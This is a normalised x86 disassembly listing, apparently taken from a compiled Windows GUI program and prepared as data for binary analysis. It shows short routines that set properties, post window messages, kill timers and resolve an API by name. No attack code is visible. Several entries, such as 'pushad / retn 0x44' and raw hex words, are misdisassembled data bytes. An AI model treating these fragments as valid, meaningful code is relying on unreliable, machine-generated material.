mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_46115c
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_4611d4
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_45d51c
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_45d51c
retn
sub_4611f0
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_45d51c
sub_461238
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_46048c
retn
mov eax edx
retn
j_sub_403788#9
jmp sub_403788
sub_461277
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d0dc
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4615dd
jmp sub_403a3c
sub_4615e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4032a8
retn
sub_4615fa
jmp sub_403a3c
sub_4616fb
jmp sub_403a3c
sub_461702
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46171f
mov eax [ ebp - 0x14 ]
call sub_4032a8
retn
sub_461718
jmp sub_403a3c
sub_46173d
jmp sub_403a3c
sub_4617c7
jmp sub_403a3c
sub_4617ce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461800
push ebx
mov ebx eax
mov eax ebx
call sub_418a70
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_42215c
sub_4618c4
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_4618d8
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_4618e0
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_461ca5
jmp sub_403a3c
sub_461cac
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_461dac
jmp sub_403a3c
sub_461db3
pop ebp
retn
sub_46296b
[ edi + edi * 8 - 0x2f002f ]
sub_462972
stc
jmp esp
sub_463db0
mov eax [ rw-data ]
retn
sub_463db8
mov [ rw-data ] eax
retn
j_sub_403788#8
jmp sub_403788
sub_463f37
jmp sub_403a3c
sub_463f3e
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46410c
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421fec
pop ebp
retn 0x8
sub_464120
call sub_422084
retn
sub_464282
jmp sub_403a3c
sub_464289
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46432d
jmp sub_403a3c
sub_464334
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4643c4
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_464af0
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_46519c
sub_464b0c
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_464af0
sub_464c2c
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_46519c
sub_464c44
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_46519c
sub_464c5c
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_46519c
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_464c88
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_464c94
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_46519c
retn
sub_464f74
push ebx
mov ebx edx
mov edx ebx
call sub_44ff44
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_464fe4
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_46510c
jmp sub_403a3c
sub_465113
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46511c
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_464528
mov eax [ ebx + 0x20c ]
call sub_464528
sub_46517c
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46518c
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_465287
jmp sub_403a3c
sub_465294
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_4652ac
sub_4654c8
retn
sub_465536
jmp sub_403a3c
sub_465575
jmp sub_403a3c
sub_4655a8
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_45143c
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_4647b4
retn
sub_4655cc
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_45145c
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_4647b4
retn
sub_4656c1
jmp sub_403a3c
sub_4656c8
mov eax [ ebp - 0x4 ]
call sub_4533bc
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_46441c
mov eax [ ebp - 0x4 ]
call sub_46519c
sub_4657fc
jmp sub_403a3c
sub_465834
jmp sub_403a3c
sub_46583b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46585b
lea eax [ ebp - 0x114 ]
call sub_404038
retn
sub_465854
jmp sub_403a3c
sub_46585b
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_465b62
jmp sub_403a3c
sub_465b69
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40365c
sub_465bbd
jmp sub_403788
sub_465c39
jmp sub_403788
sub_465c3e
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46d0dc
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465ff6
jmp sub_403a3c
sub_465ffd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4660d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d19c
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_4660f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_466128
mov edx eax
mov eax esi
call sub_41f3b4
pop esi
pop ebx
retn
sub_46610c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4674cc
mov edx eax
mov eax esi
call sub_41f3b4
pop esi
pop ebx
retn
sub_466128
push ebx
mov ebx eax
mov eax ebx
call sub_46716c
mov edx r-xdata
call sub_4253c8
pop ebx
retn
sub_46622c
push ebx
mov ebx eax
mov eax ebx
call sub_46623c
xor al 0x1
pop ebx
retn
sub_46623c
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_466298
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_4662b8
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_4662d8
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4665d1
jmp sub_403a3c
sub_4665d8
pop ecx
pop ebp
retn
sub_4665dc
xor eax eax
retn
sub_4668b4
jmp sub_403a3c
sub_4668bb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
sub_4668d1
jmp sub_403a3c
sub_4669bb
jmp sub_403a3c
sub_4669c2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4669df
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
sub_4669d8
jmp sub_403a3c
sub_4669ff
jmp sub_403a3c
sub_466cea
jmp sub_403a3c
sub_466e7d
jmp sub_403a3c
sub_46716c
mov eax [ eax + 0x238 ]
retn
sub_467174
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_467180
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_4674be
jmp sub_403a3c
sub_4674c5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4674cc
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_467514
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_450658
sub_467530
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_46756c
push ebx
mov ebx eax
mov eax ebx
call sub_4525ec
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_424c70
sub_4675f0
push ebx
mov ebx eax
mov eax ebx
call sub_452614
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_42546c
sub_467610
push ebx
mov ebx eax
mov eax ebx
call sub_467230
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_4672f8
pop ebx
retn
sub_467e3d
lea eax [ ebp - 0xb4 ]
call sub_404038
retn
sub_467e49
jmp sub_403a3c
j_sub_467e3d
jmp sub_467e3d
sub_467e50
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467fa8
jmp sub_403a3c
sub_467faf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468294
jmp sub_403a3c
sub_46829b
mov eax [ rw-data ]
call sub_46ab4c
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4682b2
add [ eax ] al
retn
sub_468510
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_468530
mov eax [ eax + 0x240 ]
call sub_42b51c
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_46c990
sub_4685d7
jmp sub_403a3c
sub_4685de
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468601
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_425444
retn
sub_4685fa
jmp sub_403a3c
sub_468601
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4687c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_468530
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_468a28
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_460640
sub_468b13
jmp sub_403a3c
sub_468b1a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_468b20
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_468308
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_468b78
call sub_4698a0
retn
sub_468fc5
jmp sub_403a3c
sub_468fcc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403788#7
jmp sub_403788
sub_469664
jmp sub_403788
sub_46975d
jmp sub_403a3c
sub_469764
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469781
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_46977a
jmp sub_403a3c
sub_469781
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_469788
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_42b51c
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4661d0
sub_4697a8
call sub_4032a8
retn
sub_469800
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_469866
jmp sub_403a3c
j_sub_403788#6
jmp sub_403788
sub_469a40
xor edx edx
call sub_466534
retn
sub_469a48
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_466534
mov eax ebx
call sub_44cad4
pop ebx
retn
sub_469ace
jmp sub_403a3c
sub_469ad5
pop ebx
pop ecx
pop ebp
retn
sub_469adc
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_4530b8
push eax
call PostMessageA
pop ebx
retn
sub_469ce0
jmp sub_403a3c
sub_469d81
jmp sub_403a3c
sub_469d8b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469daa
mov eax [ rw-data ]
call sub_46c068
retn
sub_469da3
jmp sub_403a3c
sub_469daa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469dc7
lea eax [ ebp - 0x20 ]
call sub_404038
retn
sub_469dc0
jmp sub_403a3c
sub_469dc7
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469ea8
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_44bc58
retn
mov edx eax
mov eax [ rw-data ]
call sub_46b660
retn
sub_46a22c
mov edx eax
mov eax [ rw-data ]
call sub_46d0dc
mov al 0x1
retn
sub_46a314
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_46a23c
sub_46a328
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_46a23c
sub_46a33c
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_46a23c
sub_46a350
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_46a23c
sub_46a364
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_46a4cf
jmp sub_403a3c
sub_46a4d6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a4dc
push ebx
mov ebx eax
mov eax ebx
call sub_4519d0
mov eax ebx
call sub_451b54
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_469adc
sub_46a752
jmp sub_403a3c
sub_46a759
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a760
push ebx
mov ebx edx
mov edx ebx
call sub_451e38
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_44bd60
pop ebx
retn
sub_46a7cc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46a81c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46a7e8
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46a81c
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46aa9c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46aaa8
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46aab4
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46aac0
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46aacc
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46aad8
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46aaf8
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46ab14
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4188d4
pop esi
pop ebx
retn
sub_46ab28
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_46ab30
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4188d4
pop esi
pop ebx
retn
sub_46ab44
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_46ac20
mov eax [ eax + 0x54 ]
call sub_418778
retn
sub_46ac2c
mov eax [ eax + 0x54 ]
call sub_418a70
retn
sub_46aec7
jmp sub_403a3c
sub_46af0b
jmp sub_403a3c
sub_46af12
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46af60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46ad60
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_40408c
pop esi
pop ebx
retn
sub_46afcc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4188d4
pop esi
pop ebx
retn
sub_46afe0
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_46b1e5
jmp sub_403a3c
sub_46b1ec
pop ebx
mov esp ebp
pop ebp
retn
sub_46b1f4
inc [ eax + 0x8c ]
retn
sub_46b1fc
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_46b21c
sub_46b21c
xor edx edx
call sub_46b660
retn
sub_46b652
jmp sub_403a3c
sub_46b6d9
jmp sub_403a3c
sub_46b6e8
add eax 0x30
call sub_40d4f0
retn
sub_46b72c
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_403788#5
jmp sub_403788
sub_46b782
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_46d0dc
call sub_403af0
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_46bead
jmp sub_403a3c
sub_46beb4
pop ebx
mov esp ebp
pop ebp
retn
sub_46c03c
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_46c068
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_46c094
xor edx edx
call sub_46bf8c
retn
sub_46c09c
mov dl 0x1
call sub_46bf8c
retn
sub_46c110
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_46c128
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_46c1f5
jmp sub_403a3c
sub_46c1fc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46c946
jmp sub_403788
sub_46cf44
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_403788#4
jmp sub_403788
sub_46d081
jmp sub_403788
sub_46d0ba
jmp sub_403a3c
sub_46d0c1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d0c8
call sub_40d040
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_46d2c1
jmp sub_403a3c
sub_46d2c8
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46d38f
jmp sub_403a3c
sub_46d396
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d56c
jmp sub_403a3c
sub_46d573
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d5d4
jmp sub_403a3c
sub_46d5db
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d5e4
call sub_46d3ac
retn
sub_46d7cf
jmp sub_403788
sub_46d828
jmp sub_403a3c
sub_46d82f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d95d
jmp sub_403a3c
sub_46dabc
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_46ddbb
jmp sub_403a3c
sub_46ddea
jmp sub_403a3c
sub_46def6
jmp sub_403a3c
sub_46defd
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46e28e
jmp sub_403a3c
sub_46e295
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e3b8
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46e403
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_46e414
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_46e424
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_46e497
jmp sub_403a3c
sub_46e49e
pop ebp
retn
sub_46e4a0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_46e434
call sub_403e0c
call sub_46e3b8
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_46408c
call sub_41823c
sub_46f1f8
jmp sub_403a3c
sub_46f22d
jmp sub_403a3c
sub_46f234
pop ebp
retn
sub_46f6c0
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_46f894
jmp sub_403a3c
sub_46fb75
jmp sub_403a3c
sub_46fb7c
pop ebp
retn
sub_46fb80
sub [ rw-data ] 0x1
retn
sub_46fbb5
jmp sub_403a3c
sub_46fbbc
pop ebp
retn
sub_46fbc0
sub [ rw-data ] 0x1
retn
sub_470095
jmp sub_403a3c
sub_47009c
pop ebp
retn
sub_4700a0
sub [ rw-data ] 0x1
retn
sub_470874
0xcbffdeff 0xbcff
sub_470960
pushad
retn 0x44
sub_470ca0
push ebx
mov ebx eax
mov eax ebx
call sub_4841e0
mov edx [ ebx + 0x48 ]
inc edx
mov eax ebx
call sub_44c008
pop ebx
retn
sub_470cb8
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax ebx
call sub_482a94
pop ebx
retn
sub_470cd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_471248
mov edx esi
mov eax ebx
call sub_44e484
pop esi
pop ebx
retn
sub_470e48
xor eax eax
retn
sub_471208
push esi
mov esi eax
cmp dl [ esi + 0x1ae ]
je r-xdata
pop esi
retn
mov [ esi + 0x1ae ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_471290
push esi
mov esi eax
mov eax esi
call sub_44dfb0
cmp [ esi + 0x1a9 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_4034a4
sub_4712b0
push ebx
mov ebx eax
mov eax ebx
call sub_483b04
mov edx 0x4
mov eax ebx
call sub_483acc
pop ebx
retn
sub_471320
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4713ec
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_47140c
push ebx
mov ebx eax
mov eax ebx
call sub_470d48
cmp [ ebx + 0x1cc ] 0x0
je r-xdata
pop ebx
retn
mov dl 0x1
mov eax [ ebx + 0x1b8 ]
call sub_434118
sub_471430
push ebx
mov ebx eax
mov eax ebx
call sub_470d8c
xor edx edx
mov eax [ ebx + 0x1b8 ]
call sub_434118
pop ebx
retn
sub_4715d4
push esi
mov esi eax
cmp edx [ esi + 0x1b0 ]
je r-xdata
pop esi
retn
mov [ esi + 0x1b0 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4715f0
push esi
mov esi eax
cmp dl [ esi + 0x1cd ]
je r-xdata
pop esi
retn
mov [ esi + 0x1cd ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_47160c
push esi
mov esi eax
cmp dl [ esi + 0x1b4 ]
je r-xdata
pop esi
retn
mov [ esi + 0x1b4 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4717c0
push ebx
mov ebx eax
mov eax ebx
call sub_470ca0
mov edx [ ebx + 0x48 ]
add edx 0x9
mov eax ebx
call sub_44c008
pop ebx
retn
sub_471800
push ebx
mov ebx eax
mov eax ebx
call sub_470d8c
mov [ ebx + 0x1b0 ] 0x0
pop ebx
retn
sub_471953
jmp sub_403a3c
sub_47195a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471977
mov eax [ ebp - 0x8 ]
call sub_4032a8
retn
sub_471970
jmp sub_403a3c
sub_471977
mov esp ebp
pop ebp
retn
sub_471abc
push esi
mov eax [ eax + 0x2a0 ]
mov si 0xffed
call sub_4034a4
pop esi
retn
sub_471ad0
push ebx
mov ebx edx
mov edx ebx
call sub_44d970
mov edx [ ebx ]
sub edx 0x201
jne r-xdata
pop ebx
retn
mov al 0x1
sub_471ca0
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_482a94
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_471cc0
push ebx
mov ebx eax
mov eax ebx
call sub_44e45c
mov dl [ ebx + 0x57 ]
mov eax [ ebx + 0x1a8 ]
call sub_44c794
pop ebx
retn
sub_471e8c
call sub_44db40
retn
sub_472078
mov eax [ r-xdata ]
retn
sub_472080
xor edx edx
mov ecx [ eax + 0x288 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
call sub_42c354
mov edx eax
sub_4720bd
jmp sub_403a3c
sub_4720c4
pop ebp
retn
sub_4720c8
sub [ rw-data ] 0x1
retn
sub_472ec4
pushad
retn 0x44
sub_47311e
fdivp st7
adc esi [ eax - 0x2c002b ]
jmp r-xdata
sub_473218
pushad
retn 0x44
sub_473404
mov ecx [ eax ]
call [ ecx ]
retn
sub_47361c
mov al 0x1
retn
sub_473620
mov dl 0x1
call sub_459630
retn
sub_4736d0
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_418a70
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax rw-data
call sub_40d4f0
sub_473b6c
push ebx
mov ebx eax
mov eax [ ebx + 0x2b0 ]
call sub_473364
cmp [ eax + 0x296 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x2b0 ]
call sub_473364
mov edx [ eax ]
call [ edx + 0x17c ]
sub_473ca8
mov edx [ eax ]
call [ edx + 0x180 ]
retn
sub_473f74
jmp sub_403a3c
sub_47431f
jmp sub_403a3c
sub_474326
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_474554
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2bc ]
